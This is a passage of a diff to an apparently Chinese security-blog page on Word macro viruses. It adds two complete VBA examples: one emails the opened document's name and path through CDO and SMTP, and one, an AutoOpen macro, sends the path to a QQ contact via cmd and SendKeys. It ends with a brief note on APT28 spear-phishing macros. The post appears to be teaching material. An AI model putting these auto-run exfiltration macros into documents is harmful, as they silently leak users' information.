class="keyword">Const</span> to1 = <span class="string">&quot;xxxxxxxxxx@qq.com&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> password = <span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 添加CDO库</span></span><br><span class="line">    <span class="keyword">Set</span> CDO = CreateObject(<span class="string">&quot;CDO.Message&quot;</span>)</span><br><span class="line">    CDO.<span class="keyword">from</span> = from1</span><br><span class="line">    CDO.<span class="keyword">to</span> = to1</span><br><span class="line">    CDO.Subject = Doc.Name</span><br><span class="line">    CDO.Textbody = Doc.Path</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 微软服务器网址</span></span><br><span class="line">    MsgBox (<span class="string">&quot;发送邮件&quot;</span>)</span><br><span class="line">    <span class="keyword">Const</span> proxyUrl = <span class="string">&quot;http://schemas.microsoft.com/cdo/configuration/&quot;</span></span><br><span class="line">    <span class="keyword">With</span> CDO.Configuration.Fields</span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusing&quot;</span>) = <span class="number">2</span>                     <span class="comment">&#x27;发送端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserver&quot;</span>) = <span class="string">&quot;smtp.163.com&quot;</span>       <span class="comment">&#x27;SMTP服务器地址</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserverport&quot;</span>) = <span class="number">25</span>               <span class="comment">&#x27;SMTP服务器端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpauthenticate&quot;</span>) = <span class="number">1</span>              <span class="comment">&#x27;是否开启用户名密码验证</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusername&quot;</span>) = from1              <span class="comment">&#x27;发送方邮箱名称</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendpassword&quot;</span>) = password           <span class="comment">&#x27;发送方邮箱密码</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpusessl&quot;</span>) = <span class="literal">True</span>                 <span class="comment">&#x27;是否使用ssl协议</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpconnectiontimeout&quot;</span>) = <span class="number">60</span>        <span class="comment">&#x27;时延</span></span><br><span class="line">        .Update</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送数据</span></span><br><span class="line">    CDO.Send</span><br><span class="line">    <span class="keyword">Set</span> CDO = <span class="literal">Nothing</span></span><br><span class="line">    MsgBox (<span class="string">&quot;成功!&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p>关闭文档，重新打开，出现弹窗：</p>
+<img src="/posts/772b88a4/4.1.1.png" class="" title="路径">
+<img src="/posts/772b88a4/4.1.2.png" class="" title="发送邮件">
+<img src="/posts/772b88a4/4.1.3.png" class="" title="发送错误">
+<p>这是由于发送方没有开启SMTP服务导致的错误。开启SMTP服务后，<code>password</code>的值要修改为授权码，才可以发送成功。</p>
+<img src="/posts/772b88a4/4.1.5.png" class="" title="开启SMTP服务">
+<img src="/posts/772b88a4/4.1.6.png" class="" title="发送成功">
+<p>在收信方的邮箱中可以看到发送方发送过来的文件在发送方电脑的绝对路径。</p>
+<img src="/posts/772b88a4/4.1.4.png" class="" title="发送成功">
+<h1 id="5-案例：QQ发送消息"><a href="#5-案例：QQ发送消息" class="headerlink" title="5. 案例：QQ发送消息"></a>5. 案例：QQ发送消息</h1><p>接着通过QQ发送消息来制作宏病毒，并获取对方电脑存储的具体路径。具体流程：</p>
+<ul>
+<li>获取文件路径</li>
+<li>将路径复制至剪贴板</li>
+<li>发送QQ消息</li>
+<li>通过sendkeys输入，Ctrl + V发送粘贴内容</li>
+</ul>
+<p>注意，腾讯WebQQ停止运营了，且不好获取QQ的聊天窗口句柄，才采用了该方法。</p>
+<p>完整宏代码如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    <span class="comment">&#x27; 获取文件路径</span></span><br><span class="line">    DocPath = ActiveDocument.Path</span><br><span class="line">    DocName = ActiveDocument.Name</span><br><span class="line">    Text1 = <span class="string">&quot;DocPath:&quot;</span> + DocPath</span><br><span class="line">    Text2 = <span class="string">&quot;DocName:&quot;</span> + DocName</span><br><span class="line">    Result = Text1 + Text2</span><br><span class="line">    MsgBox (Result)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 将内容送入剪贴板</span></span><br><span class="line">    <span class="keyword">With</span> CreateObject(<span class="string">&quot;new:&#123;1C3B4210-F441-11CE-B9EA-00AA006B1A69&#125;&quot;</span>)</span><br><span class="line">        .SetText Result</span><br><span class="line">        .PutInClipboard</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送QQ消息</span></span><br><span class="line">Shell <span class="string">&quot;cmd /c start tencent://Message/?Uin=收到消息的QQ号码&amp;weName=qzone.qq.com &amp; Menu=yes&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">Single</span></span><br><span class="line">    t = Timer</span><br><span class="line">    <span class="keyword">Do</span></span><br><span class="line">      DoEvents</span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> Timer - t &lt; <span class="number">2</span>    <span class="comment">&#x27;搁置2s</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 粘贴</span></span><br><span class="line">    SendKeys <span class="string">&quot;^v&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;^&#123;ENTER&#125;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p>关闭文档，重新打开，出现弹窗：</p>
+<img src="/posts/772b88a4/5.1.1.png" class="" title="路径">
+<p>点击确定后，直接向指定联系人发送Word文档在当前用户的绝对路径。当然，前提是用户已经在电脑上登录了QQ。</p>
+<img src="/posts/772b88a4/5.1.2.png" class="" title="路径">
+<h1 id="6-网络攻击中的宏病毒"><a href="#6-网络攻击中的宏病毒" class="headerlink" title="6. 网络攻击中的宏病毒"></a>6. 网络攻击中的宏病毒</h1><p>APT28组织是一个与俄罗斯政府有关的高级攻击团伙，我将通过分析该组织的攻击样本、攻击方法、攻击目的来研究一个APT组织。本次分析的是该团伙使用的宏病毒，所有资料均来自互联网。</p>
+<p>此次分析的样本一共如下三个：<br>攻击时间 攻击具体目标 发现安全公司 投递方式</p>
+<ul>
+<li>2018年10月到11月 欧洲外交处理事务政府组织 paloalto 鱼叉邮件</li>
+<li>2017年7月到8月 酒店行业 Fireeye 鱼叉邮件</li>
+<li>2017年10月 美国研究机构 cisco 鱼叉邮件</li>
+</ul>
+<p>具体的宏病毒分析看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3427">https://xz.aliyun.com/t/3427</a></p>
 
     </div>
 
@@ -322,7 +483,10 @@
     <a href="/posts/82a69c8b.html" rel="prev" title="批处理病毒攻防机理">
       <i class="fa fa-chevron-left"></i> 批处理病毒攻防机理
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/posts/8fb0b0f6.html" rel="next" title="PE数字签名">
+      PE数字签名 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -382,7 +546,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E5%AE%8F"><span class="nav-text">1. 宏</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">1.1 基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%88%9B%E5%BB%BA%E5%AE%8F"><span class="nav-text">1.2 创建宏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%95%E5%88%B6%E5%AE%8F"><span class="nav-text">1.3 录制宏</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E5%AE%8F"><span class="nav-text">1. 宏</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">1.1 基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%88%9B%E5%BB%BA%E5%AE%8F"><span class="nav-text">1.2 创建宏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%95%E5%88%B6%E5%AE%8F"><span class="nav-text">1.3 录制宏</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%AE%8F%E7%97%85%E6%AF%92"><span class="nav-text">2. 宏病毒</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">2.1 基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E8%87%AA%E5%8A%A8%E5%AE%8F%E6%A1%88%E4%BE%8B"><span class="nav-text">2.2 自动宏案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%AE%8F%E7%97%85%E6%AF%92%E6%84%9F%E6%9F%93"><span class="nav-text">2.3 宏病毒感染</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-text">3. 宏病毒的自我保护与防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%A1%88%E4%BE%8B%EF%BC%9ACDO%E8%87%AA%E5%8F%91%E9%82%AE%E7%AE%B1"><span class="nav-text">4. 案例：CDO自发邮箱</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E6%A1%88%E4%BE%8B%EF%BC%9AQQ%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF"><span class="nav-text">5. 案例：QQ发送消息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E5%AE%8F%E7%97%85%E6%AF%92"><span class="nav-text">6. 网络攻击中的宏病毒</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -398,7 +562,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -462,12 +626,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">979k</span>
+    <span title="站点总字数">986k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">14:50</span>
+    <span title="站点阅读时长">14:57</span>
 </div>
 
         
